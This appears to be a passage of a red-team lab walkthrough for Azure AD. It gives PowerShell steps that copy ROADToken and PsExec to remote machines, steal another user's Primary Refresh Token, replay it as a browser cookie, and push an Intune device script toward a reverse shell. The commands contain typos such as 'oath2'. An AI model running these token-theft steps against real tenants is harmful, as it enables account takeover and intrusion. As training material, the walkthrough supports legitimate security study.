<!-- Objective 21-->
- Copy some tools to machines `jumpvm` and after that copy tools to `infradminsrv` machine;
```powershell
Copy-Item -ToSession $jumpvm -Path C:\AzAD\Tools\ROADToken.exe -Destination C:\Users\student1\Documents -Verbose
Copy-Item -ToSession $jumpvm -Path C:\AzAD\Tools\PsExec64.exe -Destination C:\Users\student1\Documents -Verbose
Copy-Item -ToSession $jumpvm -Path C:\AzAD\Tools\SessionExecCommand.exe -Destination C:\Users\student1\Documents -Verbose
```
- Request a nonce;
```powershell
$TenantId = ""
$URL = "https://login.microsoftonline.com/$TenantId/oath2/token"
$Params = @{
	"URI" = $URL
	"Method" = "POST"
}

$Body = @{
	"grant_type" = "srv_challenge"
}

$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
$Result.Nonce
```
- Execute the command with nonce and retrieve PRT;
```powershell
Invoke-Command -Session $infradminsrv -ScriptBlock{C:\Users\Public\studentx\PsExec64.exe -accepteula -s "cmd.exe" " /c C:\Users\Public\studentx\SessionExecCommand.exe MichaelBarron C:\Users\Public\studentx\ROADToken.exe <nonce> > C:\Users\Public\studentx\PRT.exe"}
```
![KillChain](/img/prt.png "Kill Chain 2")
- Login to `https://login.microsoftonline.com/login.srf` with retrieved PRT and assign it to as a cookie when logging in as name with `x-ms-RefrestTokenCredential` cookie in the browser Incognito mode on. 
- Go to `Devices -> Scripts` on the Azure Portal and add a script as below;
```powershell
# adduser.ps1


```
- Get a reverse shell on the compromised device
<!--End of Objective 21-->